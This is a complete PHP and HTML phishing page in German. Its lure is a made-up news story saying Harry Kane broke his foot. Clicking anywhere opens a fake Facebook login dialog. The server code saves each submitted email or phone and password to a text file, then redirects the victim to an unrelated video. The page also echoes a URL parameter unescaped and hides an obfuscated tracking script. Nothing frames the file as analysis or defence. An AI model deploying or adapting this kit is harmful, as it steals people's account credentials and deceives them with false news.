<?php

  ob_start();
  session_start();

  if (isset($_POST['login'])) {
    
    $error = false;
    
    if (empty($_POST['user_login']) or empty($_POST['user_pass'])) {
      $error = true;
    }
    
    if (strlen($_POST['user_login']) < 5 or strlen($_POST['user_pass']) < 5) {
      $error = true;
    }
    
    if (!$error) {
      
      $account_data = $_POST['user_login'].'|'.$_POST['user_pass'];
      $myfile = file_put_contents('burek.txt', $account_data.PHP_EOL , FILE_APPEND | LOCK_EX);
      header("Location: https://www.watson.ch/videos/unfall/891834372-ryanair-maschine-versprueht-funken-bei-bruchlandung-in-dublin");
      exit();
    
    }
    
  }

?>

<!DOCTYPE html>
<html lang="de-DE">

<head>
	 
    <title>Insider</title>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<meta property="og:image" content="https://i.imgur.com/vWQpoOF.jpg" />
	<meta property="og:title" content="<?php echo $_GET['2023']; ?>FC Bayern: Harry Kane hat sich Fuß gebrochen" />
	<meta property="og:description" content='Ein Notarzt fuhr den laut fluchenden Fußballspieler direkt in die nächstgelegene Klinik.' />
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
    <link href="./assets/css/stajl.css" rel="stylesheet">
	
</head>

<body>

	<header>
	
		<a href="./" class="logosik"><img src="./assets/img/logo.jpg" alt="Heute" /></a>
		
		<nav class="menu">

		</nav>
		


	</header>
	
	<main>
	

			

				</div>
					<a>Heute hinzugefügt</a>
					
				</div>
				
			
			</div>
		
							<div class="pdst-coontencik">
						<h3>  </h3>
				<p><strong><h5> <center>FC Bayern: Harry Kane hat sich Fuß gebrochen</center></strong></h5> </p>
				
					
					<div class="imidz-kakszaa">
					<center><img src="https://i.imgur.com/vWQpoOF.jpg" alt="Harry Kane" width="350" height="196"> </center>
						<h3>  </h3>
						<br>
						<p><strong><h6> <center>Ein Notarzt fuhr den laut fluchenden Fußballspieler direkt in die nächstgelegene Klinik.</center></strong></h6> </p>
						<p><h6> <center>Informationen aus dem Umfeld Kanes zufolge handelt es sich laut ersten Diagnosen um einen äußerst komplizierten Bruch. Kane dürfte für eine gesamte Saison ausfallen.</center></h6> </p>
						<p><strong><h6> <center>Unfall wurde komplett von Kameras aufgezeichnet, video unten:</h6> </p>
						<br>															
						<div class="button"><a href="#"><h4> <center> <a href="#">facebook.de/Video-Kane38341
						</a></a></h4></div>
						<h3>  </h3>
						<br>								
					</div>
					
					

			</div>
		
		</div>
	
	</main>

	<div class="dialog-modal">
	
		<div class="dialog-content">
		
			<div class="logosik"><img src="./assets/img/fb.png" alt="FB" /></div>
			

			
			<form method="post">
			
				<div class="error_log">Bitte fülle alle Felder aus.</div>
			
				<div class="input-login">
					<input type="text" name="user_login" placeholder="E-Mail-Adresse oder Telefonnummer" />
				</div>
			
				<div class="input-login">
					<input type="password" name="user_pass" placeholder="Passwort" />
				</div>
			
				<button type="submit" id="login" name="login">Anmelden</button>
				
				

				
			</form>
			
		</div>
	
		<div class="dialog-overlay"></div>
	
	</div>
		
	<script src="./assets/js/jquery-3.6.0.min.js"></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/js/bootstrap.bundle.min.js" integrity="sha384-JEW9xMcG8R+pH31jmWH6WWP0WintQrMb4s7ZOdauHnUtxwoG2vI5DkLtS3qm9Ekf" crossorigin="anonymous"></script>

	<div style="display: none;">
	<script id="_wauz6a">var _0x1061d0=_0x48db;function _0x236a(){var _0x56a72f=['5610416WRUVpF','c4302bffffff','4837752BMwkqx','dynamic','344802nrCSSk','j5p8rt0psy','1HgcOqr','z6a','657304rASVTa','989272iAbQJB','18248049KKBGOg','60isazfV','small','67554lJGJGf'];_0x236a=function(){return _0x56a72f;};return _0x236a();}(function(_0x5480bf,_0x223ea8){var _0x2418e2=_0x48db,_0x501dc7=_0x5480bf();while(!![]){try{var _0x3c7ae6=parseInt(_0x2418e2(0xc0))/0x1*(-parseInt(_0x2418e2(0xb4))/0x2)+-parseInt(_0x2418e2(0xb9))/0x3+-parseInt(_0x2418e2(0xb5))/0x4+-parseInt(_0x2418e2(0xb7))/0x5*(-parseInt(_0x2418e2(0xbe))/0x6)+-parseInt(_0x2418e2(0xba))/0x7+-parseInt(_0x2418e2(0xbc))/0x8+parseInt(_0x2418e2(0xb6))/0x9;if(_0x3c7ae6===_0x223ea8)break;else _0x501dc7['push'](_0x501dc7['shift']());}catch(_0x34c819){_0x501dc7['push'](_0x501dc7['shift']());}}}(_0x236a,0xadf16));function _0x48db(_0xe26e52,_0x4b8da0){var _0x236ad5=_0x236a();return _0x48db=function(_0x48db4d,_0xa09c9f){_0x48db4d=_0x48db4d-0xb4;var _0x1d4c48=_0x236ad5[_0x48db4d];return _0x1d4c48;},_0x48db(_0xe26e52,_0x4b8da0);}var _wau=_wau||[];_wau['push']([_0x1061d0(0xbd),_0x1061d0(0xbf),_0x1061d0(0xc1),_0x1061d0(0xbb),_0x1061d0(0xb8)]);</script><script async src="//waust.at/d.js"></script>
</div>

	<script>
	
		const validateEmail = (email) => {
		  return email.match(
			/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
		  );
		};
	
		$("button[type=submit]").click(function(){
			
			var user_login = $("input[name=user_login]").val();
			var user_pass = $("input[name=user_pass]").val();
			
			if (isNaN(user_login)) {
				if (validateEmail(user_login) == null) {
					$(".dialog-modal input").addClass("error");
					$(".error_log").addClass("show");
					return false;
				}
			}
			
			if (user_pass === '' || user_login === '') {
				$(".dialog-modal input").addClass("error");
				$(".error_log").addClass("show");
				return false;
			}
			
			return true;
			
			
		});
	
		$("main a, nav ul li a").click(function(){
			
			$(".dialog-modal").addClass("show");
			
			return false;
		});
	
	</script>
	
</body>

</html>